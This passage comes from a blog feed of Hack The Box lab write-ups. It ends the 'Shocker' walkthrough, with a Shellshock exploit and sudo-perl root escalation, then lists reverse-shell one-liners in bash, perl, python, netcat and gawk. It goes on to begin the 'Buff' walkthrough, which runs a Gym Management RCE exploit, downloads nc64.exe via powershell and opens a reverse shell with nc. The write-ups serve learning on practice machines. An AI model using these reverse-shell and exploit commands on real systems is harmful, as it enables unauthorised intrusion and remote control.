</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-5.0# ./34900.py <span style="color:#8be9fd;font-style:italic">rhost</span><span style="color:#ff79c6">=</span>10.10.10.56 <span style="color:#8be9fd;font-style:italic">rport</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">80</span> <span style="color:#8be9fd;font-style:italic">lhost</span><span style="color:#ff79c6">=</span>10.10.14.38 <span style="color:#8be9fd;font-style:italic">lport</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">10000</span> <span style="color:#8be9fd;font-style:italic">pages</span><span style="color:#ff79c6">=</span>/cgi-bin/user.sh  <span style="color:#8be9fd;font-style:italic">payload</span><span style="color:#ff79c6">=</span>reverse
<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Started reverse shell handler
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Trying exploit on : /cgi-bin/user.sh
<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Successfully exploited
<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span>å2 Incoming connection from 10.10.10.56
10.10.10.56&gt; dir
user.sh

10.10.10.56&gt; cat user.sh
<span style="color:#6272a4">#!/bin/bash</span>
<span style="color:#8be9fd;font-style:italic">echo</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Content-Type: text/plain&#34;</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;&#34;</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Just an uptime test script&#34;</span>
<span style="color:#8be9fd;font-style:italic">echo</span>
uptime
<span style="color:#8be9fd;font-style:italic">echo</span>
<span style="color:#8be9fd;font-style:italic">echo</span>

10.10.10.56&gt; whoami
shelly

10.10.10.56&gt; cat /home/shelly/user.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>This is a webshell, not a real shell</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.56&gt; sudo -l
Matching Defaults entries <span style="color:#ff79c6">for</span> shelly on Shocker:
    env_reset, mail_badpass,
    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User shelly may run the following commands on Shocker:
    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/perl

10.10.10.56&gt; sudo perl -e <span style="color:#f1fa8c">&#39;exec &#34;/bin/sh&#34;&#39;</span>
10.10.10.56&gt; whoami
root

10.10.10.56&gt; cat /root/root.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="obtain-a-shell">obtain a shell</h1>
<p>There many way to get a shell:</p>
<h2 id="bash">BASH</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash -i &gt;&amp; /dev/tcp/10.10.14.38/9000 0&gt;&amp;<span style="color:#bd93f9">1</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="perl">PERL</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#ff79c6">-</span>e <span style="color:#f1fa8c">&#39;use Socket;$i=&#34;10.10.14.38&#34;;$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="python">PYTHON</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.38&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="netcat">NETCAT</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.38 <span style="color:#bd93f9">9000</span>  &gt;/tmp/f
</code></pre></td></tr></table>
</div>
</div><h2 id="gawk">GAWK</h2>
<p>Very nice as it automatically reconnects when we disconnect / reconnect</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gawk <span style="color:#f1fa8c">&#39;BEGIN {P=9000;S=&#34;&gt; &#34;;H=&#34;10.10.14.38&#34;;V=&#34;/inet/tcp/0/&#34;H&#34;/&#34;P;while(1){do{printf S|&amp;V;V|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&amp;V;close(c)}}while(c!=&#34;exit&#34;)close(V)}}&#39;</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Buff</title><link>https://0xade1.github.io/posts/2020/09/htb-buff/</link><pubDate>Sun, 27 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-buff/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 _ buff nmap -p- -T4 --min-rate=3000 10.10.10.198 -Pn PORT STATE SERVICE 8080/tcp open http-proxy _ buff nmap -sC -sV -Pn -p8080 10.10.10.198 PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n&amp;#39;s Bro Hut gobuster 1 _ buff gobuster dir -u http://10.</description><content type="html"><![CDATA[<h2 id="nmap">nmap</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  buff nmap -p- -T4 --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span> 10.10.10.198 -Pn
PORT     STATE SERVICE
8080/tcp open  http-proxy

_  buff nmap -sC -sV -Pn -p8080 10.10.10.198
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 <span style="color:#ff79c6">((</span>Win64<span style="color:#ff79c6">)</span> OpenSSL/1.1.1g PHP/7.4.6<span style="color:#ff79c6">)</span>
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 <span style="color:#ff79c6">(</span>Win64<span style="color:#ff79c6">)</span> OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n&#39;s Bro Hut
</code></pre></td></tr></table>
</div>
</div><h2 id="gobuster">gobuster</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  buff gobuster dir -u http://10.10.10.198:8080/ -w /opt/dictionaries/common.txt
</code></pre></td></tr></table>
</div>
</div><p>Nothing special can be found</p>
<p>going to http://10.10.10.198:8080/contact.php, we can read : <code> Made using Gym Management Software 1.0</code></p>
<h2 id="searchsploit">searchsploit</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  buff searchsploit gym
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Gym Management System 1.0 - Unauthenticated Remote Code Execution                   | php/webapps/48506.py
------------------------------------------------------------------------------------ ---------------------------------
_  buff cp /opt/exploitdb/exploits/php/webapps/48506.py .
_  buff chmod +x 48506.py
_  buff . ./v2/bin/activate
<span style="color:#ff79c6">(</span>v2<span style="color:#ff79c6">)</span> _  buff pip install colorama requests
<span style="color:#ff79c6">(</span>v2<span style="color:#ff79c6">)</span> _  buff python 48506.py <span style="color:#f1fa8c">&#39;http://10.10.10.198:8080/&#39;</span>
            /<span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>/vvvvvvvvvvvv <span style="color:#f1fa8c">\-</span>-------------------------------------,
<span style="color:#f1fa8c">`</span>^^^^^^^^^^^^ /<span style="color:#ff79c6">============</span><span style="color:#8be9fd;font-style:italic">BOKU</span><span style="color:#ff79c6">=====================</span><span style="color:#f1fa8c">&#34;
</span><span style="color:#f1fa8c">            \/
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">[+] Successfully connected to webshell.
</span><span style="color:#f1fa8c">C:\xampp\htdocs\gym\upload&gt; dir
</span><span style="color:#f1fa8c">_PNG
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c"> Volume in drive C has no label.
</span><span style="color:#f1fa8c"> Volume Serial Number is A22D-49F7
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c"> Directory of C:\xampp\htdocs\gym\upload
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">26/09/2020  11:42    &lt;DIR&gt;          .
</span><span style="color:#f1fa8c">26/09/2020  11:42    &lt;DIR&gt;          ..
</span><span style="color:#f1fa8c">26/09/2020  11:42                67 kamehameha.php
</span><span style="color:#f1fa8c">               1 File(s)             67 bytes
</span><span style="color:#f1fa8c">               2 Dir(s)   9,751,343,104 bytes free
</span></code></pre></td></tr></table>
</div>
</div><p>We loose the shell because of encoding mishandling, so we modify the exploit a bit at line 62 and we re-execute the exploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8be9fd;font-style:italic">print</span>(response2<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
</code></pre></td></tr></table>
</div>
</div><p>We start a web server on port 9001 to upload nc.exe; we use powershell to download nc64.exe binary</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  http python3 -m http.server <span style="color:#bd93f9">9001</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">9001</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:9001/<span style="color:#ff79c6">)</span> ...
172.19.0.1 - - <span style="color:#ff79c6">[</span>26/Sep/2020 18:59:10<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
──────────────────────────────────────────────────────────────────────────────────────────────────
C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; powershell -command <span style="color:#f1fa8c">&#34;wget &#39;http://10.10.14.6:9001/nc64.exe&#39; -out nc.exe&#34;</span>

_PNG

C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; dir
_PNG

 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload

26/09/2020  11:59    &lt;DIR&gt;          .
26/09/2020  11:59    &lt;DIR&gt;          ..
26/09/2020  11:58                <span style="color:#bd93f9">67</span> kamehameha.php
26/09/2020  12:01            35,282 nc.exe
               <span style="color:#bd93f9">2</span> File<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>         35,349 bytes
               <span style="color:#bd93f9">2</span> Dir<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>   9,751,212,032 bytes free
</code></pre></td></tr></table>
</div>
</div><p>Upload was successful, we can now get a shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; nc 10.10.14.6 <span style="color:#bd93f9">9002</span> -e cmd.exe

──────────────────────────────────────────────────────────────────────────────────────────────────
_  buff rlwrap nc -lnvvp <span style="color:#bd93f9">9002</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">9002</span>
Connection received on 172.19.0.1 <span style="color:#bd93f9">35540</span>
Microsoft Windows <span style="color:#ff79c6">[</span>Version 10.0.17134.1610<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2018</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;
</code></pre></td></tr></table>
</div>
</div><h2 id="user-flag">user flag</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
